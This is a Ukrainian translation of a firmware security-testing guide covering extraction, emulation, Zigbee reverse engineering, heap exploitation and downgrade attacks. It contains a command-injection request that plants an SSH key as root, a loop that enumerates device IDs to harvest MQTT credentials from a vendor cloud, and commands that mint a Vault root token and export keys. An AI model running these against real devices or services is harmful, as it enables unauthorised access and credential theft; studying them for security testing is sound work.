# Аналіз Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Вступ**

### Пов'язані ресурси


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware — це essential software, яке забезпечує коректну роботу пристроїв, керуючи комунікацією між апаратними компонентами та software, з яким взаємодіють користувачі, і сприяючи їй. Воно зберігається у постійній пам'яті, завдяки чому пристрій може отримувати доступ до життєво важливих інструкцій від моменту ввімкнення, що зрештою приводить до запуску операційної системи. Дослідження та потенційна модифікація firmware є critical step для виявлення security vulnerabilities.<sup>[[2]](#references)[[3]](#references)</sup>

## **Збір інформації**

**Збір інформації** — це critical initial step для розуміння структури пристрою та технологій, які він використовує. Цей процес передбачає збір даних про:

- Архітектуру CPU та операційну систему, на якій він працює
- Особливості bootloader
- Апаратну структуру та datasheets
- Метрики codebase і розташування source
- Зовнішні libraries та типи ліцензій
- Історію update та regulatory certifications
- Архітектурні діаграми та діаграми flow
- Security assessments і виявлені vulnerabilities

Для цього інструменти **open-source intelligence (OSINT)** є invaluable, так само як і аналіз будь-яких доступних компонентів open-source software за допомогою manual та automated review processes. Такі інструменти, як [Coverity Scan](https://scan.coverity.com) і [Semmle’s LGTM](https://lgtm.com/#explore), пропонують безкоштовний static analysis, який можна використовувати для пошуку potential issues.

## **Отримання Firmware**

Отримати firmware можна різними способами, кожен із яких має власний рівень складності:

- **Безпосередньо** з джерела (developers, manufacturers)
- **Зібрати** його за наданими інструкціями
- **Завантажити** з офіційних support sites
- Використовувати запити **Google dork** для пошуку розміщених firmware files
- Отримати прямий доступ до **cloud storage** за допомогою таких інструментів, як [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехоплювати **updates** за допомогою man-in-the-middle techniques
- **Витягувати** з пристрою через такі підключення, як **UART**, **JTAG** або **PICit**
- **Перехоплювати** запити на update у комунікації пристрою
- Виявляти та використовувати **hardcoded update endpoints**
- **Дампити** з bootloader або мережі
- **Вийняти та прочитати** storage chip, якщо все інше не допомогло, використовуючи відповідні hardware tools

### Логи лише через UART: примусово отримати root shell через U-Boot env у flash

Якщо UART RX ігнорується (лише логи), все одно можна примусово запустити init shell, **відредагувавши U-Boot environment blob** офлайн:<sup>[[6]](#references)</sup>

1. Зробіть дамп SPI flash за допомогою SOIC-8 clip і programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Знайдіть partition U-Boot env, відредагуйте `bootargs`, додавши `init=/bin/sh`, і **перерахуйте U-Boot env CRC32** для blob.
3. Перезапишіть лише env partition і перезавантажте пристрій; у UART має з'явитися shell.

Це корисно на embedded devices, де shell bootloader вимкнено, але до env partition можна отримати доступ для запису через external flash access.

## Аналіз firmware

Тепер, коли у вас **є firmware**, потрібно витягти з нього інформацію, щоб зрозуміти, як із ним працювати. Для цього можна використовувати різні інструменти:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Якщо за допомогою цих tools ви не знайдете багато інформації, перевірте **entropy** образу за допомогою `binwalk -E <bin>`. Якщо entropy низька, то він, імовірно, не зашифрований. Якщо entropy висока, то він, імовірно, зашифрований (або певним чином стиснений).

Крім того, ви можете використовувати ці tools для вилучення **файлів, вбудованих у firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Або [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) для перевірки файлу.

### Отримання файлової системи

За допомогою описаних вище tools, наприклад `binwalk -ev <bin>`, ви мали змогу **вилучити файлову систему**.\
Зазвичай Binwalk вилучає її в **папку, названу за типом файлової системи**, яким зазвичай є один із таких типів: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне вилучення файлової системи

Іноді binwalk **не матиме magic byte файлової системи у своїх сигнатурах**. У таких випадках використовуйте binwalk, щоб **знайти offset файлової системи та вирізати стиснену файлову систему** з binary, а потім **вручну вилучити** файлову систему відповідно до її типу, використовуючи наведені нижче кроки.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Виконайте наведену нижче **команду dd** для вилучення файлової системи Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Альтернативно, також можна виконати наведену нижче команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується у наведеному вище прикладі)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у директорії "`squashfs-root`".

- Файли архівів CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs із NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Аналіз Firmware

Після отримання firmware важливо розібрати його, щоб зрозуміти його структуру та потенційні вразливості. Цей процес передбачає використання різних інструментів для аналізу й вилучення цінних даних з образу firmware.

### Інструменти початкового аналізу

Нижче наведено набір команд для початкового аналізу бінарного файлу (позначеного як `<bin>`). Ці команди допомагають визначити типи файлів, вилучити рядки, проаналізувати бінарні дані та зрозуміти деталі розділів і файлових систем:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Щоб оцінити стан шифрування образу, перевіряють **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія свідчить про відсутність шифрування, тоді як висока ентропія може вказувати на шифрування або стиснення.

Для вилучення **вбудованих файлів** рекомендуються такі інструменти й ресурси, як документація **file-data-carving-recovery-tools** і **binvis.io** для перевірки файлів.

### Вилучення файлової системи

За допомогою `binwalk -ev <bin>` зазвичай можна вилучити файлову систему, часто в каталог із назвою, що відповідає типу файлової системи (наприклад, squashfs, ubifs). Однак коли **binwalk** не може розпізнати тип файлової системи через відсутність magic bytes, необхідне ручне вилучення. Воно передбачає використання `binwalk` для визначення зміщення файлової системи, після чого команда `dd` застосовується для вилучення файлової системи:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Після цього, залежно від типу filesystem (наприклад, squashfs, cpio, jffs2, ubifs), для ручного вилучення вмісту використовуються різні команди.

### Аналіз filesystem

Після вилучення filesystem починається пошук security flaws. Особлива увага приділяється небезпечним network daemons, hardcoded credentials, API endpoints, функціональності update server, нескомпільованому коду, startup scripts і compiled binaries для offline analysis.

**Ключові розташування** та **елементи**, які слід перевірити:

- **etc/shadow** і **etc/passwd** для облікових даних користувачів
- SSL-сертифікати та ключі в **etc/ssl**
- Файли конфігурації та скрипти на наявність потенційних вразливостей
- Вбудовані binaries для подальшого аналізу
- Поширені web servers і binaries IoT-пристроїв

Декілька інструментів допомагають виявити sensitive information і вразливості у filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) і [**Firmwalker**](https://github.com/craigz28/firmwalker) для пошуку sensitive information
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) для комплексного аналізу firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) і [**EMBA**](https://github.com/e-m-b-a/emba) для static і dynamic analysis

### Перевірки безпеки скомпільованих binaries

І source code, і compiled binaries, знайдені у filesystem, необхідно ретельно перевірити на наявність вразливостей. Такі інструменти, як **checksec.sh** для Unix binaries і **PESecurity** для Windows binaries, допомагають виявити незахищені binaries, які можна було б експлуатувати.

## Отримання cloud-конфігурації та MQTT credentials через похідні URL-токени

Багато IoT-хабів отримують конфігурацію для кожного пристрою з cloud endpoint, який має такий вигляд:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Під час аналізу firmware можна виявити, що `<token>` локально обчислюється з device ID за допомогою hardcoded secret, наприклад:

- token = MD5( deviceId || STATIC_KEY ) і представлений як hex у верхньому регістрі

Ця конструкція дає змогу будь-кому, хто дізнався deviceId і STATIC_KEY, відновити URL і отримати cloud-конфігурацію, яка часто містить MQTT credentials у plaintext і префікси topics.

Практичний workflow:

1) Витягніть deviceId із UART boot logs

- Підключіть 3.3V UART-адаптер (TX/RX/GND) і перехопіть logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Шукайте рядки, у яких виводяться шаблон URL-адреси cloud config і адреса broker, наприклад:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Відновлення STATIC_KEY і алгоритму token із firmware

- Завантажте binaries у Ghidra/radare2 і виконайте пошук шляху до config (`"/pf/"`) або використання MD5.
- Підтвердьте алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Обчисліть token у Bash і переведіть digest у верхній регістр:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Збір cloud config і MQTT credentials

- Сформуйте URL і отримайте JSON за допомогою curl; виконайте аналіз за допомогою jq, щоб витягти secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Зловживайте незашифрованим MQTT і слабкими ACL для topic (якщо вони доступні)

- Використовуйте відновлені облікові дані, щоб підписатися на maintenance topics і шукати конфіденційні події:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Перераховуйте передбачувані ID пристроїв (масштабно, з дозволом)

- У багатьох екосистемах використовуються байти OUI/продукту/типу постачальника, за якими йде послідовний суфікс.
- Ви можете перебирати можливі ID, програмно отримувати токени та завантажувати конфігурації:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Примітки
- Завжди отримуйте явний дозвіл перед спробою масового enumeration.
- За можливості надавайте перевагу емуляції або статичному аналізу для отримання секретів без модифікації цільового обладнання.


Процес емуляції firmware дає змогу виконувати **dynamic analysis** роботи пристрою або окремої програми. Цей підхід може бути ускладнений залежностями від обладнання або архітектури, але перенесення root filesystem або окремих бінарних файлів на пристрій із відповідними архітектурою та endianness, наприклад Raspberry Pi, або до попередньо створеної virtual machine може сприяти подальшому тестуванню.

### Емуляція окремих бінарних файлів

Для аналізу окремих програм важливо визначити endianness і CPU architecture програми.

#### Приклад з архітектурою MIPS

Щоб емулювати бінарний файл архітектури MIPS, можна використати команду:
```bash
file ./squashfs-root/bin/busybox
```
А для встановлення необхідних інструментів емуляції:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Для MIPS (big-endian) використовується `qemu-mips`, а для бінарних файлів із little-endian слід використовувати `qemu-mipsel`.

#### Емуляція ARM Architecture

Для ARM-бінарних файлів процес аналогічний: для емуляції використовується емулятор `qemu-arm`.

### Повна емуляція системи

Такі інструменти, як [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші, забезпечують повну емуляцію firmware, автоматизують цей процес і допомагають у dynamic analysis.

## Практичний dynamic analysis

На цьому етапі для аналізу використовується реальне або емульоване середовище пристрою. Важливо зберігати shell-доступ до ОС і файлової системи. Емуляція може не ідеально відтворювати взаємодію з hardware, тому іноді потрібно перезапускати емуляцію. Аналіз має передбачати повторне дослідження файлової системи, експлуатацію доступних вебсторінок і мережевих сервісів, а також пошук вразливостей bootloader. Тести цілісності firmware мають вирішальне значення для виявлення потенційних backdoor-вразливостей.

## Методи runtime analysis

Runtime analysis передбачає взаємодію з процесом або бінарним файлом у його робочому середовищі за допомогою таких інструментів, як gdb-multiarch, Frida та Ghidra, для встановлення breakpoint і виявлення вразливостей за допомогою fuzzing та інших методів.

Для embedded-цілей без повноцінного debugger **скопіюйте статично скомпонований `gdbserver`** на пристрій і під’єднайтеся до нього віддалено:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / зіставлення повідомлень radio co-processor

На IoT-хабах RF stack часто розділений між **radio MCU** і процесом userland у Linux. Корисний workflow полягає у відстеженні такого шляху:<sup>[[8]](#references)</sup>

1. **RF frame** у радіоефірі
2. **controller-side parser** на radio MCU
3. **serial/UART text або TLV protocol**, пересланий до Linux (наприклад `/dev/tty*`)
4. **application dispatcher** в основному daemon
5. **protocol-specific handler / state machine**

Ця архітектура створює дві цілі для reverse engineering замість однієї. Якщо controller перетворює binary radio frames на текстовий protocol на кшталт `Group,Command,arg1,arg2,...`, відновіть:

- **message groups** і dispatch tables
- які повідомлення можуть надходити з **network**, а які генерує сам controller
- точні **manufacturer-specific discriminator fields** (наприклад Zigbee `manufacturer_code` і custom `cluster_command`)
- які handlers доступні лише під час **commissioning**, discovery або firmware/model download phases

Для Zigbee окремо перехопіть pairing traffic і перевірте, чи target досі використовує default **Link Key** `ZigBeeAlliance09`. Якщо так, sniffing commissioning traffic може розкрити **Network Key**. Zigbee 3.0 install codes зменшують цей ризик, тому зазначте, чи тестований device справді їх enforce-ить.

### Manufacturer-specific protocol handlers і FSM-gated reachability

Vendor-specific Zigbee/ZCL commands часто є кращою ціллю, ніж standardized clusters, оскільки вони передають дані до **custom parsing code** і внутрішніх **FSMs** із менш перевіреною validation.<sup>[[8]](#references)</sup>

Практичний workflow:

- Виконайте reverse engineering command dispatcher, доки не знайдете **vendor-only handler**.
- Відновіть таблиці **FSM state**, **event**, **check**, **action** і **next-state**.
- Визначте **transitional states**, які автоматично переходять далі, а також retry/error branches, які зрештою reset-ять або free-ять state, контрольований attacker.
- Підтвердьте, які legitimate protocol exchanges потрібні, щоб перевести daemon у vulnerable state, замість припущення, що buggy handler завжди доступний.

Для timing-sensitive protocols packet replay із Python framework може бути надто повільним. Надійніший підхід — emulation legitimate device на реальному hardware (наприклад **nRF52840**) із vendor-grade stack, щоб можна було відкрити правильні **endpoints**, **attributes** і timing для commissioning.

### Клас fragmented-download bug в embedded daemons

Поширений клас firmware bugs виникає у **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>

1. **first fragment** (`offset == 0`) зберігає `ctx->total_size` і виділяє `malloc(total_size)`.
2. Наступні fragments перевіряють лише attacker-controlled **packet-local** fields, такі як `packet_total_size >= offset + chunk_len`.
3. Копіювання виконується через `memcpy(&ctx->buffer[offset], chunk, chunk_len)` без перевірки щодо **original allocated size**.

Це дає attacker змогу надіслати:

- Перший valid fragment із **small** declared total size, щоб примусово виконати small heap allocation.
- Наступний fragment із **expected offset**, але більшим `chunk_len`.
- Підроблений packet-local size, який проходить нові checks, водночас переповнюючи buffer, виділений спочатку.

Якщо vulnerable path захищений commissioning logic, exploitation має містити достатню **device emulation**, щоб перевести target у очікуваний model-download або blob-download state перед надсиланням malformed fragments.

### Protocol-driven `free()` triggers

В embedded daemons найпростішим способом trigger-нути heap metadata exploitation часто є не "wait for cleanup", а **примусити власну error handling логіку protocol**:<sup>[[8]](#references)</sup>

- Надсилати malformed follow-up fragments, щоб перевести FSM у **retry** або **error** states.
- Перевищити retry threshold, щоб daemon **reset-нув context** і free-нув corrupted buffer.
- Використати цей передбачуваний `free()` для trigger-у allocator-side primitives до того, як process crash-не з інших причин.

Це особливо корисно проти **musl/uClibc/dlmalloc-like** allocators в embedded Linux, де corruption chunk metadata може перетворити unlink/unbin logic на write primitive. Стабільний pattern полягає в corruption **size field**, щоб перенаправити allocator traversal до **fake chunks**, розміщених усередині overflowed buffer, замість негайного перезапису реальних bin pointers і crash-у process.

## Binary Exploitation and Proof-of-Concept

Розробка PoC для виявлених vulnerabilities потребує глибокого розуміння архітектури target і програмування мовами нижчого рівня. Binary runtime protections в embedded systems трапляються рідко, але якщо вони присутні, можуть знадобитися такі techniques, як Return Oriented Programming (ROP).

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc використовує fastbins, подібні до glibc. Пізніший large allocation може trigger-нути `__malloc_consolidate()`, тому будь-який fake chunk має пройти checks (sane size, `fd = 0` і сусідні chunks мають сприйматися як "in use").<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** якщо ASLR увімкнено, але main binary є **non-PIE**, адреси `.data/.bss` усередині binary стабільні. Можна вибрати region, який уже нагадує valid heap chunk header, щоб розмістити fastbin allocation у **function pointer table**.
- **Parser-stopping NUL:** під час parsing JSON `\x00` у payload може зупинити parsing, зберігши кінцеві attacker-controlled bytes для stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain, який викликає `open("/proc/self/mem")`, `lseek()` і `write()`, може розмістити executable shellcode у відомому mapping і перейти до нього.

## Prepared Operating Systems for Firmware Analysis

Operating systems, такі як [AttifyOS](https://github.com/adi0x90/attifyos) і [EmbedOS](https://github.com/scriptingxss/EmbedOS), надають попередньо налаштовані environments для firmware security testing, оснащені необхідними tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS — це distro, призначений для security assessment і penetration testing пристроїв Internet of Things (IoT). Він значно економить час, надаючи попередньо налаштований environment із завантаженими всіма необхідними tools.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system на базі Ubuntu 18.04, попередньо оснащений tools для firmware security testing.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Навіть коли vendor реалізує cryptographic signature checks для firmware images, **version rollback (downgrade) protection часто відсутній**. Якщо boot- або recovery-loader лише перевіряє signature за допомогою вбудованого public key, але не порівнює *version* (або monotonic counter) image, що прошивається, зловмисник може легітимно встановити **старішу vulnerable firmware, яка все ще має valid signature**, і таким чином повторно активувати patched vulnerabilities.<sup>[[4]](#references)</sup>

Типовий attack workflow:

1. **Отримати старішу signed image**
* Завантажити її з public download portal, CDN або support site vendor.
* Витягнути її з companion mobile/desktop applications (наприклад, з `assets/firmware/` всередині Android APK).
* Отримати її зі сторонніх repositories, таких як VirusTotal, Internet archives, forums тощо.
2. **Upload-нути або передати image на device** через будь-який exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT тощо.
* Багато consumer IoT devices відкривають *unauthenticated* HTTP(S) endpoints, які приймають Base64-encoded firmware blobs, декодують їх на server-side і trigger-ять recovery/upgrade.
3. Після downgrade exploit-нути vulnerability, яку було patched у новішому release (наприклад, command-injection filter, доданий пізніше).
4. За бажанням прошити latest image назад або disable-нути updates, щоб уникнути detection після отримання persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
У вразливій (пониженій) версії прошивки параметр `md5` безпосередньо додається до shell-команди без санітизації, що дає змогу ін’єктувати довільні команди (у цьому випадку — увімкнути root-доступ за SSH-ключем). У пізніших версіях прошивки додали базову фільтрацію символів, але відсутність захисту від downgrade робить це виправлення марним.<sup>[[4]](#references)</sup>

### Вилучення прошивки з мобільних застосунків

Багато vendors вбудовують повні образи прошивки у свої companion mobile applications, щоб застосунок міг оновлювати пристрій через Bluetooth/Wi-Fi. Ці пакети зазвичай зберігаються в APK/APEX без шифрування за такими шляхами, як `assets/fw/` або `res/raw/`. Такі інструменти, як `apktool`, `ghidra` або навіть звичайний `unzip`, дають змогу витягувати підписані образи, не взаємодіючи з фізичним обладнанням.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Обхід anti-rollback, доступний лише через updater, у конструкціях зі слотами A/B

Деякі vendors реалізують **ratchet** для захисту від downgrade, але лише всередині логіки *updater* (наприклад, у процедурі UDS через CAN, recovery-команді або userspace OTA agent). Якщо **bootloader** згодом перевіряє лише підпис/CRC образу та довіряє partition table або метаданим слота, захист від rollback усе ще можна обійти.<sup>[[7]](#references)</sup>

Типова слабка конструкція:

- Метадані firmware містять як дескриптор версії, так і **security ratchet** / монотонний лічильник.
- Updater порівнює ratchet образу зі значенням, збереженим у persistent storage, і відхиляє старіші підписані образи.
- Bootloader **не** аналізує цей ratchet і перед boot перевіряє лише header, CRC та підпис вибраного слота.
- Активація слота зберігається окремо в partition table або generation counter окремого слота й **криптографічно не прив’язана** до точного digest firmware, який було перевірено.

Це створює primitive **validate-one-image / boot-another-image** у dual-slot системах. Якщо attacker може змусити updater позначити slot B як наступну ціль для boot, використовуючи поточний підписаний образ, а потім перезаписати slot B до reboot, bootloader все одно може завантажити downgraded image, оскільки він довіряє лише вже зафіксованим метаданим слота.

Поширений шаблон зловживання:

1. Завантажити **поточний підписаний** firmware в passive slot і виконати стандартну процедуру validation/switch, щоб layout позначив цей slot як наступний active.
2. **Поки що не виконувати reboot**. Повторно увійти в процедуру slot-preparation/erase у тій самій session.
3. Скористатися застарілою boot-state або застарілою логікою вибору слота, щоб updater стер **той самий фізичний slot**, який щойно було promoted.
4. Записати в цей slot **старіший, але все ще підписаний** firmware.
5. Пропустити validation routine, яка застосовує ratchet, і виконати reboot безпосередньо.
6. Bootloader вибере promoted slot, перевірить лише signature/integrity і завантажить старий image.

Що слід шукати під час reverse engineering реалізацій A/B update:

- Вибір слота, що визначається **boot-time flags**, які не оновлюються після успішного switch.
- Процедуру на кшталт `prepare_passive_slot()`, яка стирає slot на основі застарілого state, а не **поточного зафіксованого layout**.
- Функцію на кшталт `part_write_layout()`, яка лише збільшує **generation counter** / active flag і не зберігає hash перевіреного образу.
- Перевірки ratchet, реалізовані в userspace або коді updater, але **відсутні** в ROM / bootloader / secure boot stages.
- Erase або recovery routines, які залишають slot позначеним як bootable навіть після видалення та повторного запису його вмісту.

### Контрольний список для оцінювання логіки update

* Чи належним чином захищено transport/authentication *update endpoint* (TLS + authentication)?
* Чи порівнює device **номери версій** або **монотонний anti-rollback counter** перед flashing?
* Чи перевіряється image всередині secure boot chain (наприклад, signatures перевіряються ROM code)?
* Чи **bootloader застосовує той самий ratchet**, що й updater, замість перевірки лише signature/CRC?
* Чи **метадані активації слота прив’язані** до validated firmware digest/version, чи slot можна змінити після promotion?
* Після успішного switch слота device примусово виконує reboot, чи подальші update/erase routines усе ще доступні в тій самій session?
* Чи виконує userland code додаткові sanity checks (наприклад, дозволену partition map, номер моделі)?
* Чи використовують *partial* або *backup* update flows ту саму validation logic?

> 💡  Якщо будь-який із наведених пунктів відсутній, platform, імовірно, вразлива до rollback attacks.

## Вразливий firmware для практики

Щоб практикувати пошук vulnerabilities у firmware, використовуйте наведені нижче проєкти вразливого firmware як starting point.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Відновлення ключів розшифрування firmware зі стану embedded KMS/Vault

Коли update image містить невеликі plaintext metadata та великий blob із високою ентропією, спочатку виконайте triage контейнера, а не brute-forcing:<sup>[[1]](#references)</sup>

- Виведіть headers, offsets і line boundaries за допомогою `hexdump`, `xxd`, `strings -tx`, `base64 -d` та `binwalk -E`.
- `Salted__` зазвичай означає формат OpenSSL `enc`: наступні 8 bytes є salt, а решта — ciphertext.
- Поле Base64, яке декодується рівно в `256` bytes, є вагомою ознакою того, що ви маєте справу з RSA-2048 ciphertext, який обгортає random firmware password/session key.
- Відокремлений PGP material у тому самому file часто забезпечує лише authenticity; не вважайте його механізмом confidentiality.

Якщо статичний пошук ключів (`grep`, `strings`, пошук PEM/PGP) не дає результату, виконуйте reverse engineering **operational decrypt path**, а не лише пошук private keys:

- Декомпілюйте updater / management binary і простежте, хто читає encrypted blob, який helper/API його unwraps і яке logical key name він запитує.
- Шукайте у витягнутій root filesystem стан KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), а також unit files та init scripts.
- Розглядайте plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens або local KMS auto-unseal scripts як еквівалент private-key material.

Якщо appliance постачається з оригінальним Vault binary та storage backend, зазвичай простіше відтворити це environment, ніж повторно реалізовувати внутрішні механізми Vault:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
З root-доступом до клонованого KMS:

- Зробіть transit keys доступними для експорту лише всередині ізольованого клону: `vault write transit/keys/<name>/config exportable=true`
- Експортуйте unwrap key: `vault read transit/export/encryption-key/<name>`
- Спробуйте recovered RSA key із точною парою padding/hash, яку використовує KMS. Невдала розшифровка PKCS#1 v1.5 і невдала стандартна розшифровка OAEP **не** доводять, що ключ неправильний; багато потоків на основі Vault використовують OAEP із SHA-256, тоді як поширені бібліотеки за замовчуванням використовують SHA-1.
- Якщо payload починається з `Salted__`, точно відтворіть KDF OpenSSL від vendor (`EVP_BytesToKey`, часто MD5 на legacy appliances), перш ніж виконувати розшифровку AES-CBC.

Це перетворює проблему "encrypted firmware" на загальнішу: **відновіть operational keys на стороні appliance, а потім офлайн відтворіть точні параметри unwrap + KDF**.

## Навчання та сертифікації

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Злам firmware за допомогою Claude: навички senior-рівня, автономність junior-рівня](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Методологія тестування безпеки firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Практичний IoT Hacking: вичерпний посібник з атак на Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Експлуатація zero-day у покинутому hardware — блог Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Як Smart Device за $20 надав мені доступ до вашого дому](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Тепер ви бачите mi: тепер ви Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv — Експлуатація Tesla Wall Connector через його charge port connector — частина 2: обхід anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Змусити його блимати: Over-the-Air Exploitation Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
